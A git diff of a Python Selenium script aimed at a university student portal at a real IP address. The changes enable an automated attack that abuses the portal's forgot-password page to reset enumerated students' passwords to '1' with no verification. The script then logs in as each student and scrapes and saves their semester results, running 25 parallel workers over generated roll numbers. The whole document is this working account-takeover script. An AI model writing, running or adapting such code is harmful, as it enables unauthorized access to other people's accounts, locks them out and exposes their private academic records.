@@ -73,16 +73,16 @@ def process_student(roll_number):
         print(f"Processing {roll_number}...")
         
         # Step 1: Open the forget password page
-        # driver.get("http://202.168.87.90/StudentPortal/ForgetPassword.aspx")
-        # time.sleep(2)
+        driver.get("http://202.168.87.90/StudentPortal/ForgetPassword.aspx")
+        time.sleep(2)
         
-        # driver.find_element(By.ID, "txt_username").send_keys(roll_number)
-        # driver.find_element(By.ID, "txtnewpass").send_keys("1")
-        # driver.find_element(By.ID, "txtConfirmpass").send_keys("1")
-        # driver.find_element(By.ID, "btnSubmit").click()
-        # time.sleep(3)
-        # alert = driver.switch_to.alert
-        # alert.accept()
+        driver.find_element(By.ID, "txt_username").send_keys(roll_number)
+        driver.find_element(By.ID, "txtnewpass").send_keys("1")
+        driver.find_element(By.ID, "txtConfirmpass").send_keys("1")
+        driver.find_element(By.ID, "btnSubmit").click()
+        time.sleep(3)
+        alert = driver.switch_to.alert
+        alert.accept()
         
         # Step 2: Login
         driver.get("http://202.168.87.90/StudentPortal/Login.aspx")
@@ -96,7 +96,7 @@ def process_student(roll_number):
         # Step 3: Select semester and show results
         if driver.current_url == "http://202.168.87.90/StudentPortal/default.aspx":
             select_element = Select(driver.find_element(By.ID, "ddlSemester"))
-            select_element.select_by_value("2")
+            select_element.select_by_value("1")
             driver.find_element(By.ID, "btnimgShowResult").click()
             time.sleep(5)
             
@@ -115,10 +115,10 @@ def process_student(roll_number):
             #     result_data.append([cell.text for cell in cells])
             
             # Save results
-            with open(f"second/{roll_number}.json", "w") as file:
+            with open(f"first/{roll_number}.json", "w") as file:
                 json.dump(user_data, file, indent=4)
             
-            with open(f"second/{roll_number}.html", "w", encoding="utf-8") as file:
+            with open(f"first/{roll_number}.html", "w", encoding="utf-8") as file:
                 file.write(table_html)
             
             print(f"{roll_number} results saved.")
@@ -130,6 +130,6 @@ def process_student(roll_number):
         driver.quit()
 
 if __name__ == "__main__":
-    roll_numbers = [f"2023UGCS{str(i).zfill(3)}" for i in range(1, 126)]
+    roll_numbers = [f"2023UGCS{str(i).zfill(3)}" for i in range(24, 26)]
     with multiprocessing.Pool(processes=25) as pool:  # Adjust process count as needed
         pool.map(process_student, roll_numbers)
